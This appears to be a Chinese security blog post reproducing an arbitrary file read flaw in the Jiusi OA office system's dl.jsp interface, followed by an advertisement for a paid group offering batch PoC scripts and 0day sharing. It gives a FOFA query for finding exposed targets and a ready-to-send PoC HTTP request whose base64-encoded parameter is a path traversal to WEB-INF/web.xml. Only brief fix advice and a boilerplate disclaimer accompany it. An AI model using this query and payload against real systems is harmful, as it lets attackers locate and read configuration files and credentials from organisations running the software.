#  「漏洞复现」九思OA dl.jsp 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-11-18 04:37  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
九思OA产品，由北京九思协同软件有限公司（简称九思软件）开发，是一款面向企事业单位和政府机关的高端协同办公系统。致力于“打造管理神器，释放组织潜能”，为客户的信息化、数字化和智能化转型提供优质的方案、产品和服务。它融合了多种管理思想和OA接口技术，旨在帮助企业打破管理边界、整合信息孤岛，形成有序、实时、规范、开放、高效率、低成本、柔性、有凝聚力的管理环境和一体化的技术支撑环境。  
  
0x03  
  
**漏洞威胁**  
  
北京九思协同办公软件dl.jsp接口处存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="/jsoa/login.jsp"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qXsX4dYS6ia3BK0S1NhkkkO7zzO5pIPbFHibTwCVzQ8DU9XfwJssNcL7v4ufolIlibiakyYrxOAEI0eA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qXsX4dYS6ia3BK0S1NhkkkOMbGytee9XYJpxvCIzviajs22gKylE5jWQr9M8pkNEIZSGtTyrdTbN1g/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qXsX4dYS6ia3BK0S1NhkkkOYjeU8JPcUX8rTiboeRWsSzwlicCokxHnVfViakic26Ff06aXuwpNDkhKlg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
对用户传入的参数进行限制。  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qXsX4dYS6ia3BK0S1NhkkkOhspIiacfC7krUXProCPOicA2lxBT6q51iaYzJOmvibZrCQiciaVIZTriay1sQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qXsX4dYS6ia3BK0S1NhkkkOAL44NJMiaXHcagph6GV8HVb9d09ppgNLqicqsGIwGMA3bPSKzvaVwekA/640?wx_fmt=gif&from=appmsg "")  
  
  
